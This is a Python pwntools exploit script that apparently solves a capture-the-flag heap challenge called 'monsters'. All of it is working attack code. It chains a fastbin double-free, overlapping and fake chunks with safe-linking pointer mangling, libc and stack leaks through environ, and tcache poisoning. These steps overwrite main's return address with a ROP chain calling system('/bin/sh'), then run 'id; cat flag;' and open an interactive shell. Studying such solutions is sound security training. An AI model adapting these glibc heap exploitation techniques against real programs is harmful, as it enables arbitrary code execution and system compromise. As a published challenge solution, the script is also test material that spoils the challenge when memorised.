#!/usr/bin/env python
# from ctypes import cdll
# libc = cdll.LoadLibrary('libc.so.6')
# from pathlib import Path
from pwn import *
sys.tracebacklimit = 3
context(endian = "little", encoding='ascii') # arch='amd64'
context.terminal = ["tmux", "splitw", "-h"]
const = constants
os.chdir('./dist')
exe_path = '%s_patched' % ('./challenge')
e = context.binary = ELF(exe_path, checksec=False)
libc_path = ('./libc.so.6')
# libc_path = ('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF(libc_path, checksec=False)
gdbscript = """\
#source /home/hacker/.gef.py
#gef config context.layout ''
# -- exe
break *0x401234
continue
# disp/3i $pc
"""
host, port = ('nc monsters.ctf.theromanxpl0.it 7009').split()[-2:]
start_time = time.time()

def u64(b): return packing.u64(b.ljust(8, b'\0'))

def gdb_pause(interactive=False):
    if args.REMOTE: return
    d = r.clean(0.1)
    input(f'gdb {r.pid}')
    if interactive: r.interactive()
    r.unrecv(d)

def conn(argv=[]):
    if args.REMOTE:
        r = remote(host, int(port))
    elif args.GDB:
        r = gdb.debug(argv or [exe_path], exe=exe_path, gdbscript=gdbscript)
    else:
        r = process(argv or [exe_path])
    return r

def cmd(n): r.sendlineafter(prompt, str(n))

def farm_max_lvl():
    with context.silent:
        r.sendline('2 1 3')
        r.sendline('2 2 3 ' * 5)
        r.sendline('2 3 3 2 3')
        out = r.clean(0.2 if args.REMOTE else 0.1)
        r.unrecv(out[-20:])
        cmd(1)
        r.recvuntil('\nLevel: ')
        lvl = int(r.recvline())
    assert lvl > 999, lvl
    pass

def alloc(idx, name=b'aaaa', atk=0, defense=0):
    cmd(4)
    r.sendlineafter('> ', str(idx + 1))
    r.sendlineafter('> ', str(1))
    r.sendafter('name: ', name)
    r.sendlineafter(': ', str(atk))
    r.sendlineafter(': ', str(defense))
    pass

def free(idx):
    cmd(4)
    r.sendlineafter('> ', str(idx + 1))
    r.sendlineafter('> ', str(2))

def heap_atk(fakechunk_addr):
    a, b, victim = 8, 9, 11
    with log.progress('create an overflapping chunk using fastbin'), context.silent:
        # fillup tcache
        for i in range(7 + 2): alloc(i + 1)
        alloc(10) # padding
        for i in range(7): free(i + 1)
        free(a)
        free(b)
        free(a)

        # drain tcache
        for i in reversed(range(0, 7)): alloc(i + 1)
        alloc(a, atk=fakechunk_addr ^ (fakechunk_addr >> 12))
        alloc(b)
        alloc(a) #a
        alloc(victim)

    c, d, e, f = range(1, 4 + 1)
    with log.progress('prepare 2 fakechunks for fake largechunk'), context.silent:
        next_fakechunk_addr = fakechunk_addr + 0x10 + 0x420
        free(d)
        free(c)
        free(victim)
        alloc(victim, flat(0, 0x41, (fakechunk_addr>>12) ^ next_fakechunk_addr))
        alloc(c)
        fakechunk2 = flat({0x18: 0x21}, filler=b'\0')
        alloc(d, fakechunk2, defense=0x21) #target

    with log.progress('free fake largechunk'), context.silent:
        free(victim)
        alloc(victim, flat(0, 0x421))
        free(c)
        # leak libc
        cmd(1)
        r.recvuntil('Chest: ')
        r.recvuntil('Attack: ')
        libc_leak = int(r.recvline())

    info(f'LEAK: {libc_leak  = :#x}')
    libc_base = libc.address = libc_leak - (libc.sym.main_arena+96)
    assert libc_base & 0xfff == 0, hex(libc_base)

    with log.progress('leaking stack'), context.silent:
        alloc(c)
        free(e)
        free(c)
        free(victim)
        alloc(victim, flat(0, 0x41, (fakechunk_addr>>12) ^ (libc.sym.environ - 0x18)))
        alloc(c)
        alloc(e, b'a'*8) #target

        cmd(1)
        r.recvuntil('Waist: ')
        stack_leak = u64(r.recvuntil('\nAttack: ', drop=True)[8:])

    info(f'LEAK: {stack_leak  = :#x}')
    main_rip_ptr = stack_leak - 0x130
    info(f'CALC: {main_rip_ptr  = :#x}')

    rop = ROP(libc)
    # rop.raw(rop.ret)
    rop.system(next(libc.search('/bin/sh')))
    print(rop.dump())

    with log.progress('rop main'), context.silent:
        free(f)
        free(c)
        free(victim)
        alloc(victim, flat(0, 0x41, (fakechunk_addr>>12) ^ (main_rip_ptr - 0x8)))
        alloc(c)
        alloc(f, bytes(rop), defense=rop.ret.address) #target
    gdb_pause()
    cmd(5) # quit
    pass

# libc.sym['__libc_start_call_main'] = 0x2a150
prompt = 'Exit\n> '
r = conn()
def main():
    global r
    name = 'a'*32
    r.sendafter('!\n> ', name)
    time.sleep(0.1)
    farm_max_lvl()

    # leak heap
    alloc(0) # fakechunk for overlapping
    cmd(1); r.recvuntil('Name: '); r.recv(32)
    heap_leak = u64(r.recvuntil('\nLevel: ', drop=True))
    info(f'LEAK: {heap_leak = :#x}')
    fakechunk_addr = heap_leak + 0x20
    info(f'LEAK: {fakechunk_addr = :#x}')
    fakechunk = flat(0, 0x41, fakechunk_addr >> 12)
    free(0)
    alloc(0, fakechunk)

    heap_atk(fakechunk_addr)
    pass

try:
    main()
    log.success(f'duration: {time.time() - start_time}')
    # r.clean(0.2)
    r.sendline('id; cat flag;')
    r.interactive()
# except KeyboardInterrupt:
#     import traceback
#     traceback.print_exc()
#     exit(2)
except Exception as exc:
    raise exc
